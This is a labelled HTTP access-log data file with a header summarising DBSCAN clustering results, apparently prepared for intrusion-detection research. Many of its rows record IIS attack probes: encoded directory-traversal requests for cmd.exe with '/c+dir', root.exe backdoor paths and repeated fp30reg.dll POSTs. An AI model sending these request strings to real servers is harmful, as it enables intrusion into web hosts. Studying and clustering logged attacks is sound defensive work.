#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.006379 seconds)
#  ~ The DBSCAN clustering process was performed in 0.193605 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 93.13%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["AE0"]. Details:{'AE': 484}
#       Cluster [1] contains 979 items. MV:["AA1"]. Details:{'AA': 979}
#       Cluster [2] contains 109 items. MV:["AB2"]. Details:{'AB': 109}
#       Cluster [3] contains 86 items. MV:["AE3"]. Details:{'AE': 86}
#       Cluster [4] contains 587 items. MV:["AC4"]. Details:{'AC': 587}
#       Cluster [5] contains 23 items. MV:["AD5"]. Details:{'AD': 23}
#       Cluster [6] contains 14 items. MV:["AD6"]. Details:{'AD': 14}
#       Cluster [7] contains 3 items. MV:["AC7"]. Details:{'AC': 3}
#       Cluster [8] contains 46 items. MV:["AI8"]. Details:{'AI': 46}
#       Cluster [9] contains 100 items. MV:["AH9"]. Details:{'AH': 100}
#       Cluster [10] contains 125 items. MV:["AF10"]. Details:{'AF': 125}
#       Cluster [11] contains 16 items. MV:["AD11"]. Details:{'AD': 16}
#       Cluster [12] contains 32 items. MV:["AH12"]. Details:{'AH': 32}
#       Cluster [13] contains 769 items. MV:["AJ13"]. Details:{'AJ': 769}
#       Cluster [14] contains 14 items. MV:["AK14"]. Details:{'AK': 14}
#       Cluster [15] contains 54 items. MV:["AK15"]. Details:{'AE': 1, 'AK': 53}
#       Cluster [16] contains 5 items. MV:["AD16"]. Details:{'AD': 5}
#       Cluster [17] contains 57 items. MV:["AL17"]. Details:{'AL': 57}
#       Cluster [18] contains 23 items. MV:["AG18"]. Details:{'AG': 23}
#       Cluster [19] contains 23 items. MV:["AK19"]. Details:{'AK': 23}
#
#  ~ Details of outliers: {'AC': 1, 'AD': 1, 'AE': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  AA  |  AB  |  AC  |  AD  |  AE  |  AF  |  AG  |  AH  |  AI  |  AJ  |  AK  |  AL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   AA   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |   AB   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |   AC   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |   AD   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |   AE   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |   AF   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |   AG   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |   AH   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |   AI   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |   AJ   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |   AK   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |   AL   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Http_protocol@,ObjectSize~,Agent@,HTTP_method,ClientRequestLine@,StatusCode,ClientIP$,Referrer~,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1107143916,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
1107143921,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9218028040100,"-","AA","S207","A_1"
1107148776,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061183208219,"-","AE","S399","A_0"
1107152444,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9210022146234,"-","AE","S128","A_0"
1107157725,"HTTP/1.1",2898,"-","GET","/","'403'",9068214068216,"-","AE","S520","A_3"
1107160164,"HTTP/1.1",2898,"-","GET","/","'403'",9068214068216,"-","AE","S520","A_3"
1107165247,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9065122119010,"-","AE","S454","A_0"
1107178762,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160129,"-","AE","S291","A_0"
1107198001,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9066255109222,"-","AE","S481","A_0"
1107199684,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9199063000001,"-","AE","S60","A_0"
1107207292,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9024094203115,"-","AE","S344","A_0"
1107209989,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9221079146007,"-","AE","S286","A_0"
1107213320,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9070048009026,"-","AE","S561","A_0"
1107213587,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160087,"-","AE","S311","A_0"
1107213653,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9070183086076,"-","AE","S560","A_0"
1107232859,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9062177153106,"-","AE","S420","A_0"
1107246256,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218022120198,"-","AE","S195","A_0"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248046,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248047,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248045,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248049,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248049,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248049,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248049,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248049,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107248049,"HTTP/1.1",407,"-","POST","/_vti_bin/_vti_aut/fp30reg.dll","'404'",9065117045251,"-","AC","S453","A_4"
1107249290,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222083129198,"-","AE","S316","A_0"
1107257372,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9216070251002,"-","AE","S171","A_0"
1107259674,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9068223144102,"-","AE","S522","A_0"
1107264790,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264790,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264791,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264791,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264792,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264796,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264796,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264797,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264797,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264798,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264798,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264799,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264799,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9221184100013,"-","AB","S276","A_2"
